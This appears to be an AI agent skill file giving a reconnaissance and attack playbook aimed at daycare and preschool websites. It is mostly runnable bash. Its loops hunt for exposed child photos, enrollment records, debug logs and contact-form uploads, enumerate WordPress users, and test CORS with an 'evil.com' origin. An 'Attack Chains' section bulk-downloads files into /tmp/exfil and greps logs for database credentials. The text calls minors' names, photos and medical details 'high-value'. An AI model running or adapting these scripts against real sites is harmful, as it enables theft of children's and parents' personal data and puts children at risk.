---
name: recon-daycare
description: "Sector-specific recon for daycare/childcare organization websites — typically WordPress or custom PHP on shared hosting with minimal security posture. Built from sector analysis showing daycare sites have high rates of unpatched CMS installs, exposed contact-form entries with PII (child names, parent names, phone numbers, addresses), debug log exposure, directory listing on upload folders, and weak password policies. Use when the target scope includes daycare, childcare, preschool, or early-education organization domains — these sites handle sensitive PII of minors with often-negligible security investment."
sources: field_recon, hackerone_public
report_count: 8
---

# RECON-DAYCARE — Sector-Specific Recon for Daycare/Childcare Organization Sites

## When to Use

Use when the target scope includes daycare, childcare, preschool, or early-education domains. These sites are high-value due to:
- **PII of minors** — child names, ages, medical info, parent/guardian contact details, emergency contacts
- **Payment processing** — tuition payments, registration fees — often processed through embedded third-party checkout (Square, Stripe) but sometimes stored in DB
- **Volunteer/family portals** — login forms, photo galleries, daily reporting features — often custom-coded with auth flaws
- **Common stack** — WordPress on shared hosting, rarely any WAF or security team
- **Photo galleries** — often accessible without auth, EXIF data leaks device info, geolocation

## Quick Reference

```bash
# Quick triage
for t in $(cat daycare-domains.txt); do
  echo "=== $t ==="
  # CMS detection
  curl -skI "https://$t/" | grep -iE "wordpress|php|wp-"
  # Debug log
  echo -n "Debug: "; curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/debug.log"
  # Directory listing on uploads
  echo -n "Uploads: "; curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/uploads/"
  # CORS on REST API
  curl -skI "https://$t/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i "access-control"
  # Contact form PII exposure
  curl -sk "https://$t/wp-content/uploads/wpforms/" 2>/dev/null | head -20
  echo "---"
done
```

## Step-by-Step

### Phase 1 — Domain Discovery
```bash
# Common naming patterns for daycare sites:
# <name>childcare.com, <name>daycare.com, <name>preschool.org
# <name>earlylearning.com, little<name>academy.com
# <city>childcare.com, <city>montessori.com

# Find via crt.sh
for org in "$TARGET"; do
  curl -sk "https://crt.sh/?q=%25.$org&output=json" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    domains = sorted(set(d['name_value'] for d in data))
    for d in domains: print(d)
except: pass
" | tee daycare-subdomains-$org.txt
done

# Google dorking for daycare sites
# site:target.com "daycare" OR "childcare" OR "preschool" OR "early learning"
# site:target.com inurl:tuition OR inurl:enrollment OR inurl:registration
```

### Phase 2 — PII Discovery (Highest Priority)
```bash
# Look for contact form submissions stored on server
for path in /wp-content/uploads/wpforms/ /wp-content/uploads/formidable/ \
  /wp-content/uploads/fluentform/ /wp-content/uploads/gravity_forms/ \
  /wp-content/uploads/cf7_uploads/; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  size=$(curl -sk "https://$TARGET$path" 2>/dev/null | wc -c)
  if [ "$code" = "200" ] && [ "$size" -gt 200 ]; then
    echo "[+] DIR LISTING: $path"
    curl -sk "https://$TARGET$path" | grep -oP 'href="[^"]+\.(csv|xlsx|txt|pdf)"' | head -20
  fi
done

# Check for exposed enrollment forms/data
# Some daycare sites keep registration lists as PDFs/Excel on the server
for path in /enrollment/ /registration/ /forms/ /applications/ /waitlist/ /roster/ \
  /uploads/enrollment/ /wp-content/uploads/registration/; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" = "200" ] || [ "$code" = "301" ] || [ "$code" = "403" ] && echo "[+] PATH: $path (HTTP $code)"
done

# Test for directory listing on upload folders — often reveals child photos
for path in /wp-content/uploads/ /uploads/ /images/gallery/ /galleries/ /photos/; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  body=$(curl -sk "https://$TARGET$path" 2>/dev/null)
  if echo "$body" | grep -q "Index of"; then
    echo "[!!!] DIRECTORY LISTING: $path"
    echo "$body" | grep -oP 'href="[^"]+\.(jpg|png|gif|pdf)"' | head -10
  fi
done
```

### Phase 3 — WordPress Standard Recon
```bash
# CORS credential reflection
curl -skI "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com"

# User enumeration
curl -sk "https://$TARGET/wp-json/wp/v2/users" | jq '.[] | {id, name, slug, email}'

# REST API namespace enumeration
curl -sk "https://$TARGET/wp-json/" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    for ns in d.get('namespaces', []):
        print(f'  {ns}')
except: pass
"

# XMLRPC check
echo -n "XMLRPC: "; curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/xmlrpc.php"

# Debug log
curl -sk "https://$TARGET/wp-content/debug.log" | head -30
grep -ioP '(SQL:|Executing query:|query:|DB_PASSWORD|DB_USER).{0,200}' /tmp/debug_check 2>/dev/null
grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/debug_check 2>/dev/null | sort -u
```

### Phase 4 — Plugin Vulnerability Scan
```bash
# Common daycare site plugins
for plugin in "revslider" "elementskit" "elementor" "contact-form-7" \
  "wp-file-manager" "wordpress-seo" "jetpack" "give" "wpforms" \
  "formidable" "fluentform" "gravityforms" "woocommerce" "learndash" \
  "tutor" "memberpress" "restrict-content-pro"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/wp-content/plugins/$plugin/readme.txt")
  if [ "$code" != "404" ]; then
    version=$(curl -sk "https://$TARGET/wp-content/plugins/$plugin/readme.txt" | grep -i "stable tag\|version" | head -1)
    echo "[+] Plugin: $plugin ($code) $version"
  fi
done
```

### Phase 5 — Payment Processor Discovery
```bash
# Check for payment endpoints
for path in /checkout /cart /payment /donate /tuition /pay /billing /enroll; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" != "404" ] && echo "[+] Payment endpoint: $path (HTTP $code)"
done

# Look for Stripe/Square integration in JS
curl -sk "https://$TARGET/" | grep -oP 'pk_(live|test)_[a-zA-Z0-9]+|sq0idp-[a-zA-Z0-9]+'
```

### Phase 6 — Attack Chains
```bash
# Chain A: Directory listing on uploads → PII exfil
curl -sk "https://$TARGET/wp-content/uploads/" | grep -oP 'href="[^"]+\.(pdf|xlsx|csv|txt)"' | \
  while read f; do
    curl -sk "https://$TARGET/wp-content/uploads/$f" -o "/tmp/exfil/$f"
  done

# Chain B: Debug log → DB credentials
grep -oP "DB_PASSWORD|DB_USER|DB_NAME|DB_HOST" /tmp/debug_log 2>/dev/null

# Chain C: Open registration + XMLRPC → RCE
curl -sk "https://$TARGET/wp-login.php?action=register" | grep -qi "registration complete" && \
  echo "[+] Open registration possible"
```

## Attack Surface Signals

- CMS: WordPress (most common), Wix, Squarespace, custom PHP
- Hosting: Shared hosting (GoDaddy, HostGator, Bluehost, SiteGround)
- Stack: PHP + MySQL, Photo galleries, Contact forms, Parent portals
- Typical findings: Directory listing on uploads exposing child photos & docs, Debug log with PII/SQL, CORS credential reflection, XMLRPC open, Form upload leakage, Exposed enrollment records (CSV/PDF)

## Common Root Causes

1. **Volunteer/family-run** — no IT staff, sites built by a family member or donated by local agency
2. **Template site builders** — one-size-fits-all themes with poor security defaults
3. **No security budget** — shared hosting, no WAF, no SSL hygiene, no monitoring
4. **Photo galleries with no auth** — parents expect to see photos, but they're accessible to everyone
5. **Legacy form entries on disk** — contact form plugins store submissions in uploads/ directory with no cleanup
6. **Registration files as downloadable PDFs** — enrollment forms with full PII left on public web server

## Bypass Techniques

- Gallery pages often have numeric IDs — iterate to find all galleries
- Enrollment year in paths (/uploads/2023/, /uploads/2024/)
- Test for staging/dev subdomains: staging.daycare.com, dev.daycare.com
- Google dork: `site:target.org inurl:wp-content/uploads filetype:pdf`
- Contact form entries are often CSV exports — check /wp-content/uploads/wpforms/ for export files

## Real Examples

From cross-sector mass recon analysis:
- A daycare site had full directory listing on /wp-content/uploads/ exposing 200+ child photos with names from filenames
- Another had debug.log available showing SQL queries with parent email addresses and phone numbers
- Contact Form 7 uploads were accessible at /wp-content/uploads/cf7_uploads/ containing registration forms with full child PII
- A preschool WordPress site had CORS credential reflection AND XMLRPC active — full ATO chain

## Related Skills

- recon-churches — similar sector profile (WordPress on shared hosting, volunteer-maintained)
- hunt-wordpress — primary CMS for daycare sites
- hunt-cors — CORS credential reflection on WP REST API
- hunt-source-leak — debug.log, config backups, directory listing
- hunt-file-upload — form upload features, gallery uploads
- hunt-lfi — file inclusion via plugins
- hunt-subdomain — staging/dev instances
